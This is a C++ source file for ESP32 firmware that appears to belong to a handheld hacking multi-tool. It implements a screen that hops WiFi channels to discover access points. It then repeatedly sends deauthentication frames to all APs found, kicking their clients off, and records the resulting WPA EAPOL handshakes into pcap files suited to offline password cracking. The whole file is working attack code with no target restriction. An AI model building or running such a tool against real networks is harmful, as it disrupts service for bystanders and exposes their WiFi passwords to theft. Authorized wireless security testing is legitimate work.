#include "WifiEapolCaptureScreen.h"
#include "core/Device.h"
#include "core/ScreenManager.h"
#include "screens/wifi/WifiMenuScreen.h"
#include "ui/actions/ShowStatusAction.h"

#include "utils/WifiAttackUtil.h"
#include <cstring>

// ── Static definitions ────────────────────────────────────────────────────

const char* WifiEapolCaptureScreen::SAVE_DIR = "/unigeek/wifi/eapol";

WifiEapolCaptureScreen::RawCapture WifiEapolCaptureScreen::_ring[WifiEapolCaptureScreen::RING_SIZE] = {};
volatile int  WifiEapolCaptureScreen::_ringHead    = 0;
volatile int  WifiEapolCaptureScreen::_ringTail    = 0;
volatile bool WifiEapolCaptureScreen::_skipBeacons = false;

WifiEapolCaptureScreen::ApTarget WifiEapolCaptureScreen::_apTargets[WifiEapolCaptureScreen::MAX_TARGETS] = {};
int WifiEapolCaptureScreen::_apCount = 0;

std::unordered_map<
  WifiEapolCaptureScreen::MacAddr,
  WifiEapolCaptureScreen::EapolEntry,
  WifiEapolCaptureScreen::MacHash,
  WifiEapolCaptureScreen::MacEqual
> WifiEapolCaptureScreen::_eapolMap = {};

std::unordered_map<
  WifiEapolCaptureScreen::MacAddr,
  std::string,
  WifiEapolCaptureScreen::MacHash,
  WifiEapolCaptureScreen::MacEqual
> WifiEapolCaptureScreen::_ssidMap = {};

std::unordered_map<
  WifiEapolCaptureScreen::MacAddr,
  std::vector<std::vector<uint8_t>>,
  WifiEapolCaptureScreen::MacHash,
  WifiEapolCaptureScreen::MacEqual
> WifiEapolCaptureScreen::_pending = {};

// ── PCAP structs ──────────────────────────────────────────────────────────

#pragma pack(push, 1)
struct PcapGlobalHdr {
  uint32_t magic    = 0xA1B2C3D4;
  uint16_t vmaj     = 2;
  uint16_t vmin     = 4;
  int32_t  tz       = 0;
  uint32_t sig      = 0;
  uint32_t snap     = 65535;
  uint32_t linktype = 105;   // LINKTYPE_IEEE802_11
};
struct PcapPktHdr {
  uint32_t ts_sec;
  uint32_t ts_usec;
  uint32_t incl_len;
  uint32_t orig_len;
};
#pragma pack(pop)

// ── Destructor ────────────────────────────────────────────────────────────

WifiEapolCaptureScreen::~WifiEapolCaptureScreen() {
  _skipBeacons = false;
  esp_wifi_set_promiscuous_rx_cb(nullptr);
  esp_wifi_set_promiscuous(false);
  if (_attacker) {
    delete _attacker;
    _attacker = nullptr;
  }
  _eapolMap.clear();
  _ssidMap.clear();
  _pending.clear();
  _apCount  = 0;
  _ringHead = 0;
  _ringTail = 0;
}

// ── Log buffer ────────────────────────────────────────────────────────────

void WifiEapolCaptureScreen::_pushLog(const char* msg, uint16_t color) {
  int idx = _logHead % LOG_SIZE;
  strncpy(_log[idx].msg, msg, sizeof(_log[idx].msg) - 1);
  _log[idx].msg[sizeof(_log[idx].msg) - 1] = '\0';
  _log[idx].color = color;
  _logHead = (idx + 1) % LOG_SIZE;
  if (_logCount < LOG_SIZE) _logCount++;
}

// ── Lifecycle ─────────────────────────────────────────────────────────────

void WifiEapolCaptureScreen::onInit() {
  _channel          = 0;
  _needRefresh      = false;
  _ringHead         = 0;
  _ringTail         = 0;
  _skipBeacons      = false;
  _apCount          = 0;
  _logHead          = 0;
  _logCount         = 0;
  _totalEapol       = 0;
  _handshakes       = 0;
  _phase            = PHASE_DISCOVERY;
  _discoveryCount   = 0;
  _attackChanCount  = 0;
  _attackChanIdx    = 0;
  _deauthFired      = false;
  _midDeauthSent    = false;
  _chanDwellUntil   = 0;
  _midDeauthAt      = 0;
  memset(_lastEapolName, 0, sizeof(_lastEapolName));

  _eapolMap.clear();
  _ssidMap.clear();
  _pending.clear();

  _storageOk     = false;
  _lastFreeCheck = 0;

  if (!Uni.Storage || !Uni.Storage->isAvailable()) {
    ShowStatusAction::show("No storage available.");
    Screen.setScreen(new WifiMenuScreen());
    return;
  }

  if (Uni.Storage->freeBytes() < MIN_FREE_BYTES) {
    ShowStatusAction::show("Not enough storage.\nNeed 50 KB free.");
    Screen.setScreen(new WifiMenuScreen());
    return;
  }

  Uni.Storage->makeDir(SAVE_DIR);
  _storageOk = true;

  _pushLog("Discovery scan...", TFT_DARKGREY);

  // WifiAttackUtil ctor sets WIFI_MODE_AP + softAP (needed for esp_wifi_80211_tx)
  _attacker = new WifiAttackUtil();
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&WifiEapolCaptureScreen::_promiscuousCb);

  render();
}

void WifiEapolCaptureScreen::onUpdate() {
  const unsigned long now = millis();

  _flush();   // process ring buffer first so APs are registered before deauth

  if (_phase == PHASE_DISCOVERY) {
    if (now >= _chanDwellUntil) {
      _channel = (_channel % 13) + 1;
      _attacker->setChannel(_channel);
      _discoveryCount++;

      char buf[44];
      snprintf(buf, sizeof(buf), "Scan CH%d", _channel);
      _pushLog(buf, TFT_DARKGREY);
      _chanDwellUntil = now + DISCOVERY_DWELL_MS;
      render();

      if (_discoveryCount >= 13) {
        _discoveryCount = 0;
        _buildAttackChans();
        if (_attackChanCount > 0) {
          _phase        = PHASE_ATTACK;
          _skipBeacons  = true;   // stop beacons from evicting EAPOL in ring
          _attackChanIdx = 0;
          _pushLog("Attacking APs...", TFT_WHITE);
          _hopToAttackChan();
        } else {
          _pushLog("No APs, rescanning", TFT_DARKGREY);
          _channel = 0;   // restart from CH1 next dwell
        }
      }
    }

  } else {  // PHASE_ATTACK
    if (!_deauthFired) {
      _sendDeauth(_channel);
      _deauthFired   = true;
      _midDeauthSent = false;
      _midDeauthAt   = now + ATTACK_DWELL_MS / 2;
      render();
    }

    // Mid-dwell second burst — if no EAPOL yet for this channel's APs
    if (!_midDeauthSent && now >= _midDeauthAt) {
      _midDeauthSent = true;
      _sendDeauth(_channel);
      render();
    }

    if (now >= _chanDwellUntil) {
      _attackChanIdx = (_attackChanIdx + 1) % _attackChanCount;

      // Rebuild at the start of each new cycle through all attack channels
      if (_attackChanIdx == 0) {
        _buildAttackChans();
        if (_attackChanCount == 0) {
          _phase          = PHASE_DISCOVERY;
          _skipBeacons    = false;  // re-enable beacons to discover new APs
          _discoveryCount = 0;
          _channel        = 0;
          _chanDwellUntil = now;
          _pushLog("Done, rescanning...", TFT_WHITE);
          render();
        }
      }

      if (_attackChanCount > 0) {
        _hopToAttackChan();
      }
    }
  }

  if (_needRefresh) {
    _needRefresh = false;
    render();
  }

  if (Uni.Nav->wasPressed()) {
    auto dir = Uni.Nav->readDirection();
    if (dir == INavigation::DIR_BACK || dir == INavigation::DIR_PRESS) {
      onBack();
    }
  }
}

void WifiEapolCaptureScreen::onRender() {
  TFT_eSprite sp(&Uni.Lcd);
  sp.createSprite(bodyW(), bodyH());
  sp.fillSprite(TFT_BLACK);

  const int totalRows = bodyH() / ROW_H;
  const int logRows   = totalRows - 1;   // last row reserved for status bar

  // Draw log entries: oldest at top, newest just above status bar
  const int shown = (_logCount < logRows) ? _logCount : logRows;
  for (int i = 0; i < shown; i++) {
    // physIdx: walk backwards from _logHead to get oldest→newest order
    int physIdx = (_logHead - shown + i + LOG_SIZE) % LOG_SIZE;
    int y = (logRows - shown + i) * ROW_H;
    sp.setTextDatum(TL_DATUM);
    sp.setTextColor(_log[physIdx].color, TFT_BLACK);
    sp.drawString(_log[physIdx].msg, 0, y, 1);
  }

  // Status bar (last row): EAPOL count left | latest AP name right
  const int statusY = (totalRows - 1) * ROW_H;
  sp.fillRect(0, statusY, bodyW(), ROW_H, 0x2104);  // dark grey band

  char countBuf[24];
  snprintf(countBuf, sizeof(countBuf), "Captured: %u", _handshakes);
  sp.setTextDatum(ML_DATUM);
  sp.setTextColor(_handshakes > 0 ? TFT_MAGENTA : TFT_DARKGREY, 0x2104);
  sp.drawString(countBuf, 2, statusY + ROW_H / 2, 1);

  if (_lastEapolName[0] != '\0') {
    sp.setTextDatum(MR_DATUM);
    sp.setTextColor(TFT_CYAN, 0x2104);
    sp.drawString(_lastEapolName, bodyW() - 2, statusY + ROW_H / 2, 1);
  }

#ifndef DEVICE_HAS_KEYBOARD
  // Non-keyboard boards: render a visible "< Back" bar so user knows to press BTN_A
  // Overlay the status bar row with back hint (replaces it when no keyboard)
  const uint16_t accent = Config.getThemeColor();
  sp.fillRect(0, statusY, bodyW(), ROW_H, accent);
  sp.setTextDatum(MC_DATUM);
  sp.setTextColor(TFT_WHITE, accent);
  sp.drawString("< Back / PRESS", bodyW() / 2, statusY + ROW_H / 2, 1);
#endif

  sp.pushSprite(bodyX(), bodyY());
  sp.deleteSprite();
}

void WifiEapolCaptureScreen::onBack() {
  Screen.setScreen(new WifiMenuScreen());
}

// ── Phase helpers ─────────────────────────────────────────────────────────

// Build the list of unique channels that still have APs needing more EAPOL.
void WifiEapolCaptureScreen::_buildAttackChans() {
  _attackChanCount = 0;
  for (int i = 0; i < _apCount; i++) {
    MacAddr mac;
    memcpy(mac.data(), _apTargets[i].bssid, 6);
    auto it = _eapolMap.find(mac);
    if (it != _eapolMap.end() && it->second.hasM1 && it->second.hasM2) continue;
    if (_apTargets[i].deauthCount >= MAX_DEAUTH_ATTEMPTS) continue;  // exhausted

    uint8_t ch = _apTargets[i].channel;
    bool dup = false;
    for (int j = 0; j < _attackChanCount; j++) {
      if (_attackChans[j] == ch) { dup = true; break; }
    }
    if (!dup && _attackChanCount < 13) {
      _attackChans[_attackChanCount++] = ch;
    }
  }
}

// Hop to the current attack channel and arm timing/flags.
void WifiEapolCaptureScreen::_hopToAttackChan() {
  _channel     = _attackChans[_attackChanIdx];
  _attacker->setChannel(_channel);
  _deauthFired    = false;
  _midDeauthSent  = false;
  _chanDwellUntil = millis() + ATTACK_DWELL_MS;

  char buf[44];
  snprintf(buf, sizeof(buf), "Attack CH%d (%d APs)", _channel, _attackChanCount);
  _pushLog(buf, TFT_WHITE);
}

// ── Deauth injection ──────────────────────────────────────────────────────

void WifiEapolCaptureScreen::_registerApTarget(const MacAddr& bssid, uint8_t ch) {
  for (int i = 0; i < _apCount; i++) {
    if (memcmp(_apTargets[i].bssid, bssid.data(), 6) == 0) {
      _apTargets[i].channel = ch;
      return;
    }
  }
  if (_apCount < MAX_TARGETS) {
    memcpy(_apTargets[_apCount].bssid, bssid.data(), 6);
    _apTargets[_apCount].channel = ch;
    _apCount++;
  }
}

void WifiEapolCaptureScreen::_sendDeauth(int ch) {
  if (_apCount == 0 || !_attacker) return;

  int deauthed = 0;
  for (int i = 0; i < _apCount; i++) {
    if (_apTargets[i].channel != (uint8_t)ch) continue;

    MacAddr mac;
    memcpy(mac.data(), _apTargets[i].bssid, 6);
    auto it = _eapolMap.find(mac);
    if (it != _eapolMap.end() && it->second.hasM1 && it->second.hasM2) continue;
    if (_apTargets[i].deauthCount >= MAX_DEAUTH_ATTEMPTS) continue;

    // Light burst — heavier TX blocks promiscuous RX and loses M2
    for (int b = 0; b < 2; b++) {
      _attacker->deauthenticate(_apTargets[i].bssid, (uint8_t)ch);
    }
    _apTargets[i].deauthCount++;
    deauthed++;
  }

  if (deauthed > 0) {
    char buf[44];
    snprintf(buf, sizeof(buf), "Deauth CH%d (%d AP)", ch, deauthed);
    _pushLog(buf, TFT_YELLOW);
  }
}

// ── Storage free space guard ──────────────────────────────────────────────

bool WifiEapolCaptureScreen::_checkFreeSpace() {
  if (!_storageOk) return false;
  const unsigned long now = millis();
  if (now - _lastFreeCheck < 5000) return true;
  _lastFreeCheck = now;
  if (Uni.Storage->freeBytes() < MIN_FREE_BYTES) {
    _storageOk = false;
    _pushLog("Storage full! Stopped.", TFT_RED);
    ShowStatusAction::show("Storage full!\nCapture stopped.", 2000);
    return false;
  }
  return true;
}

// ── PCAP helpers ──────────────────────────────────────────────────────────

std::string WifiEapolCaptureScreen::_sanitize(const std::string& s) {
  std::string out;
  out.reserve(s.size());
  for (char c : s) {
    if ((c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') ||
        (c >= '0' && c <= '9') || c == '-' || c == '.') {
      out += c;
    } else {
      out += '_';
    }
  }
  return out;
}

std::string WifiEapolCaptureScreen::_makePath(const MacAddr& bssid, const std::string& ssid) {
  char mac[13];
  snprintf(mac, sizeof(mac), "%02X%02X%02X%02X%02X%02X",
           bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
  std::string safe = _sanitize(ssid);
  if (safe.empty()) safe = "unknown";
  return std::string(SAVE_DIR) + "/" + mac + "_" + safe + ".pcap";
}

void WifiEapolCaptureScreen::_writePcapHeader(const std::string& path) {
  if (!_checkFreeSpace()) return;
  fs::File f = Uni.Storage->open(path.c_str(), FILE_WRITE);
  if (!f) return;
  PcapGlobalHdr hdr;
  f.write(reinterpret_cast<uint8_t*>(&hdr), sizeof(hdr));
  f.close();
}

void WifiEapolCaptureScreen::_appendPcapFrame(const std::string& path,
                                               const uint8_t* data, uint16_t len) {
  if (!_checkFreeSpace()) return;
  fs::File f = Uni.Storage->open(path.c_str(), FILE_APPEND);
  if (!f) return;
  PcapPktHdr ph;
  const unsigned long ms = millis();
  ph.ts_sec   = ms / 1000;
  ph.ts_usec  = (ms % 1000) * 1000;
  ph.incl_len = len;
  ph.orig_len = len;
  f.write(reinterpret_cast<uint8_t*>(&ph), sizeof(ph));
  f.write(data, len);
  f.close();
}

// ── EAPOL message type parser ─────────────────────────────────────────────

// Returns: 1=M1 (AP→STA, ACK set, no MIC), 2=M2 (STA→AP, MIC set, no ACK),
//          3=M3, 4=M4, 0=unknown/other.
// Key Information (big-endian, 2 bytes at eapol[5..6]):
//   bit 7 (0x0080): Key ACK  (set on M1, M3)
//   bit 8 (0x0100): Key MIC  (set on M2, M3, M4)
static int _parseEapolMsg(const uint8_t* data, uint16_t len) {
  static const uint8_t snap[8] = {0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x88, 0x8E};
  for (uint16_t i = 24; i + 16 <= len; i++) {
    bool match = true;
    for (int k = 0; k < 8; k++) { if (data[i + k] != snap[k]) { match = false; break; } }
    if (!match) continue;
    const uint8_t* e = data + i + 8;   // EAPOL header starts here
    if (len < i + 8 + 7) return 0;
    if (e[1] != 0x03) return 0;        // not EAPOL-Key
    if (e[4] != 0x02) return 0;        // not RSN key descriptor
    uint16_t ki  = ((uint16_t)e[5] << 8) | e[6];
    bool     ack = (ki & 0x0080) != 0;
    bool     mic = (ki & 0x0100) != 0;
    bool     ins = (ki & 0x0040) != 0;
    if  (ack && !mic)        return 1;  // M1
    if (!ack &&  mic && !ins) return 2;  // M2
    if  (ack &&  mic)        return 3;  // M3
    if (!ack &&  mic &&  ins) return 4;  // M4
    return 0;
  }
  return 0;
}

// ── Main loop frame processor ─────────────────────────────────────────────

void WifiEapolCaptureScreen::_flush() {
  while (_ringTail != _ringHead) {
    const RawCapture& cap = _ring[_ringTail];
    _ringTail = (_ringTail + 1) % RING_SIZE;

    if (cap.isBeacon) {
      // Parse SSID from beacon IEs (802.11 header=24B + fixed params=12B = offset 36)
      bool newSsid = false;
      if (_ssidMap.find(cap.bssid) == _ssidMap.end() && cap.len >= 38) {
        uint16_t pos = 36;
        while (pos + 2 <= cap.len) {
          uint8_t id   = cap.data[pos];
          uint8_t elen = cap.data[pos + 1];
          if (pos + 2 + elen > cap.len) break;
          if (id == 0 && elen > 0 && elen <= 32) {
            _ssidMap.emplace(cap.bssid,
              std::string(reinterpret_cast<const char*>(cap.data + pos + 2), elen));
            newSsid = true;
            break;
          }
          pos += 2 + elen;
        }
      }

      // Register this AP for future deauth injections
      _registerApTarget(cap.bssid, cap.channel);

      // Log newly discovered AP
      if (newSsid) {
        auto ssidIt = _ssidMap.find(cap.bssid);
        if (ssidIt != _ssidMap.end()) {
          char buf[44];
          snprintf(buf, sizeof(buf), "AP: %s", ssidIt->second.c_str());
          _pushLog(buf, TFT_CYAN);
          _needRefresh = true;
        }
      }

      // If SSID just became available, flush buffered EAPOL frames
      auto ssidIt = _ssidMap.find(cap.bssid);
      if (ssidIt == _ssidMap.end()) continue;

      auto& entry = _eapolMap[cap.bssid];
      if (entry.ssid.empty()) entry.ssid = ssidIt->second;

      auto pendIt = _pending.find(cap.bssid);
      if (pendIt == _pending.end() || pendIt->second.empty()) continue;

      if (_storageOk && entry.filepath.empty()) {
        entry.filepath = _makePath(cap.bssid, entry.ssid);
        _writePcapHeader(entry.filepath);
        _appendPcapFrame(entry.filepath, cap.data, cap.len);
        entry.beaconWritten = true;
      }

      if (_storageOk && !entry.filepath.empty()) {
        for (auto& frame : pendIt->second) {
          _appendPcapFrame(entry.filepath, frame.data(), (uint16_t)frame.size());
        }
      }
      _pending.erase(pendIt);

    } else {
      // EAPOL frame
      auto& entry  = _eapolMap[cap.bssid];
      auto  ssidIt = _ssidMap.find(cap.bssid);

      if (ssidIt != _ssidMap.end()) {
        if (entry.ssid.empty()) entry.ssid = ssidIt->second;
        if (_storageOk && entry.filepath.empty()) {
          entry.filepath = _makePath(cap.bssid, entry.ssid);
          _writePcapHeader(entry.filepath);
        }
        if (_storageOk && !entry.filepath.empty()) {
          _appendPcapFrame(entry.filepath, cap.data, cap.len);
        }
      } else {
        auto& pend = _pending[cap.bssid];
        if ((int)pend.size() < MAX_PENDING) {
          pend.emplace_back(cap.data, cap.data + cap.len);
        }
      }

      entry.count++;
      _totalEapol++;

      // Parse EAPOL message type to track handshake completeness
      const bool alreadyComplete = entry.hasM1 && entry.hasM2;

      int msg = _parseEapolMsg(cap.data, cap.len);
      if (msg == 1) entry.hasM1 = true;
      if (msg == 2 || msg == 4) entry.hasM2 = true;  // M2 or M4 both have MIC
      if (msg == 3) entry.hasM1 = true;               // M3 also carries ANonce

      const bool wasComplete = !alreadyComplete && entry.hasM1 && entry.hasM2;

      // Determine display name for this AP (SSID or MAC)
      const char* apName = nullptr;
      char macBuf[18];
      if (ssidIt != _ssidMap.end() && !ssidIt->second.empty()) {
        apName = ssidIt->second.c_str();
      } else {
        snprintf(macBuf, sizeof(macBuf), "%02X:%02X:%02X:%02X:%02X:%02X",
                 cap.bssid[0], cap.bssid[1], cap.bssid[2],
                 cap.bssid[3], cap.bssid[4], cap.bssid[5]);
        apName = macBuf;
      }

      strncpy(_lastEapolName, apName, sizeof(_lastEapolName) - 1);
      _lastEapolName[sizeof(_lastEapolName) - 1] = '\0';

      char buf[44];
      static const char* msgName[] = {"EAPOL", "M1", "M2", "M3", "M4"};
      const char* mLabel = (msg >= 1 && msg <= 4) ? msgName[msg] : msgName[0];
      snprintf(buf, sizeof(buf), "%s: %s", mLabel, apName);
      uint16_t logColor = (msg == 2 || msg == 4) ? TFT_GREEN : TFT_YELLOW;
      _pushLog(buf, logColor);

      if (wasComplete) {
        _handshakes++;
        snprintf(buf, sizeof(buf), "Handshake! %s", apName);
        _pushLog(buf, TFT_MAGENTA);
      }

      _needRefresh = true;
      if (Uni.Speaker) Uni.Speaker->beep();
    }
  }
}

// ── Promiscuous callback (IRAM_ATTR — must stay in .cpp) ──────────────────

void IRAM_ATTR WifiEapolCaptureScreen::_promiscuousCb(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (buf == nullptr) return;
  if (type != WIFI_PKT_MGMT && type != WIFI_PKT_DATA) return;

  const auto     pkt = static_cast<wifi_promiscuous_pkt_t*>(buf);
  const uint8_t* pay = pkt->payload;
  const uint16_t len = (uint16_t)pkt->rx_ctrl.sig_len;

  if (len < 24) return;

  const uint16_t fc     = (uint16_t)pay[0] | ((uint16_t)pay[1] << 8);
  const uint8_t  fcType = (fc & 0x000C) >> 2;
  const uint8_t  fcSub  = (fc & 0x00F0) >> 4;

  // ── Beacon (management type=0, subtype=8) ─────────────────────────────
  if (fcType == 0 && fcSub == 8 && len >= 36) {
    if (_skipBeacons) return;  // attack phase: keep ring free for EAPOL
    int next = (_ringHead + 1) % RING_SIZE;
    if (next == _ringTail) return;

    RawCapture& slot = _ring[_ringHead];
    memcpy(slot.bssid.data(), pay + 16, 6);
    uint16_t copyLen = len > MAX_FRAME ? MAX_FRAME : len;
    memcpy(slot.data, pay, copyLen);
    slot.len      = copyLen;
    slot.channel  = pkt->rx_ctrl.channel;
    slot.isBeacon = true;
    _ringHead     = next;
    return;
  }

  // ── Data frame (type=2) — search for SNAP+EAPOL ───────────────────────
  if (fcType != 2) return;

  const uint8_t toDs   =  pay[1] & 0x01;
  const uint8_t fromDs = (pay[1] & 0x02) >> 1;

  MacAddr bssid{};
  if (toDs && !fromDs) {
    memcpy(bssid.data(), pay + 4, 6);
  } else if (!toDs && fromDs) {
    memcpy(bssid.data(), pay + 10, 6);
  } else {
    memcpy(bssid.data(), pay + 16, 6);
  }

  const uint8_t snap[8] = {0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x88, 0x8E};
  for (uint16_t i = 24; i + 9 <= len; i++) {
    bool match = true;
    for (int k = 0; k < 8; k++) {
      if (pay[i + k] != snap[k]) { match = false; break; }
    }
    if (!match) continue;

    if (pay[i + 9] != 0x03) return;

    int next = (_ringHead + 1) % RING_SIZE;
    if (next == _ringTail) return;

    RawCapture& slot = _ring[_ringHead];
    memcpy(slot.bssid.data(), bssid.data(), 6);
    uint16_t copyLen = len > MAX_FRAME ? MAX_FRAME : len;
    memcpy(slot.data, pay, copyLen);
    slot.len      = copyLen;
    slot.channel  = pkt->rx_ctrl.channel;
    slot.isBeacon = false;
    _ringHead     = next;
    return;
  }
}
